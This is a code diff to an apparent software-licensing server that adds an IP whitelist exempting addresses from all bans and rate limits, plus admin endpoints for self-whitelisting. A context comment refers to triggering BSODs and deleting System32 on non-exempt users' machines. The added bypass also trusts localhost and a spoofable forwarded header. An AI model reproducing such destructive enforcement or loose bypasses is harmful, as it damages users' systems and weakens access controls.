@@ -204,6 +204,12 @@ function advancedRateLimit(req, res, next) {
     
     const ip = req.ip || req.connection.remoteAddress;
     
+    // Check if IP is whitelisted (bypass ALL checks)
+    if (isIPWhitelisted(ip)) {
+        console.log(`✅ Whitelisted IP: ${ip} - bypassing all rate limits`);
+        return next();
+    }
+    
     // Check if IP is banned
     if (bannedIPs.has(ip)) {
         // #region agent log
@@ -491,6 +497,11 @@ function getRateLimitKey(req) {
 function checkRateLimit(req) {
     const key = getRateLimitKey(req);
     const ip = req.ip || req.connection.remoteAddress;
+    
+    // Check if IP is whitelisted (bypass ALL checks)
+    if (isIPWhitelisted(ip)) {
+        return { allowed: true, remaining: 999, whitelisted: true };
+    }
     
     // Check if IP is banned
     if (bannedIPs.has(ip)) {
@@ -1279,6 +1290,24 @@ const licenses = {
 // Blacklist storage (HWID and IP addresses)
 const blacklistedHWIDs = [];
 const blacklistedIPs = [];
+
+// ========================================
+// IP WHITELIST - These IPs bypass ALL bans and rate limits
+// ========================================
+const whitelistedIPs = new Set([
+    '::1',                    // localhost IPv6
+    '127.0.0.1',              // localhost IPv4
+    '::ffff:127.0.0.1',       // localhost mapped
+    // Add your IP here - it will bypass all bans
+]);
+
+// Function to check if IP is whitelisted
+function isIPWhitelisted(ip) {
+    if (!ip) return false;
+    const cleanIP = ip.split(',')[0].trim();
+    return whitelistedIPs.has(cleanIP) || 
+           whitelistedIPs.has(cleanIP.replace('::ffff:', ''));
+}
 
 // Whitelist storage (License keys that are exempt from BSOD and System32 deletion)
 const whitelistedLicenseKeys = ['LICENSE-21262A9912B0CD4E']; // Whitelist user's key by default
@@ -4480,7 +4509,8 @@ app.post('/auth/admin/security-stats', validateAppSecret, (req, res) => {
 
 // Rotate owner key
 app.post('/auth/admin/rotate-owner-key', validateAppSecret, (req, res) => {
-    ownerKeyData = generateOwnerKey();
+    // Call the proper rotateOwnerKey function
+    rotateOwnerKey();
     console.log(`🔄 Owner key rotated manually`);
     res.json({
         success: true,
@@ -4520,6 +4550,87 @@ app.post('/auth/admin/reset-rate-limits', validateAppSecret, (req, res) => {
         message: 'Rate limits cleared',
         rate_limits_cleared: rlCount,
         failed_attempts_cleared: faCount
+    });
+});
+
+// ========================================
+// IP WHITELIST MANAGEMENT
+// ========================================
+
+// Whitelist an IP (bypasses ALL bans and rate limits)
+app.post('/auth/admin/whitelist-ip', validateAppSecret, (req, res) => {
+    const { ip } = req.body;
+    
+    if (!ip) {
+        return res.json({ success: false, message: 'IP address required' });
+    }
+    
+    whitelistedIPs.add(ip);
+    // Also remove from bans if present
+    bannedIPs.delete(ip);
+    
+    console.log(`✅ IP whitelisted: ${ip}`);
+    res.json({
+        success: true,
+        message: `IP ${ip} has been whitelisted and will bypass all bans`,
+        whitelisted_ips: Array.from(whitelistedIPs)
+    });
+});
+
+// Remove IP from whitelist
+app.post('/auth/admin/unwhitelist-ip', validateAppSecret, (req, res) => {
+    const { ip } = req.body;
+    
+    if (!ip) {
+        return res.json({ success: false, message: 'IP address required' });
+    }
+    
+    whitelistedIPs.delete(ip);
+    
+    console.log(`❌ IP removed from whitelist: ${ip}`);
+    res.json({
+        success: true,
+        message: `IP ${ip} has been removed from whitelist`,
+        whitelisted_ips: Array.from(whitelistedIPs)
+    });
+});
+
+// List all whitelisted IPs
+app.post('/auth/admin/list-whitelisted-ips', validateAppSecret, (req, res) => {
+    res.json({
+        success: true,
+        whitelisted_ips: Array.from(whitelistedIPs),
+        count: whitelistedIPs.size
+    });
+});
+
+// Get my IP (for user to know their IP)
+app.post('/auth/admin/get-my-ip', validateAppSecret, (req, res) => {
+    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'unknown';
+    const cleanIP = ip.split(',')[0].trim();
+    
+    res.json({
+        success: true,
+        your_ip: cleanIP,
+        is_whitelisted: isIPWhitelisted(cleanIP),
+        is_banned: bannedIPs.has(cleanIP)
+    });
+});
+
+// Whitelist my current IP
+app.post('/auth/admin/whitelist-my-ip', validateAppSecret, (req, res) => {
+    const ip = req.ip || req.connection.remoteAddress || req.headers['x-forwarded-for'] || 'unknown';
+    const cleanIP = ip.split(',')[0].trim();
+    
+    whitelistedIPs.add(cleanIP);
+    bannedIPs.delete(cleanIP);
+    
+    console.log(`✅ Self-whitelisted IP: ${cleanIP}`);
+    res.json({
+        success: true,
+        message: `Your IP (${cleanIP}) has been whitelisted`,
+        your_ip: cleanIP,
+        whitelisted_ips: Array.from(whitelistedIPs)
     });
 });
 
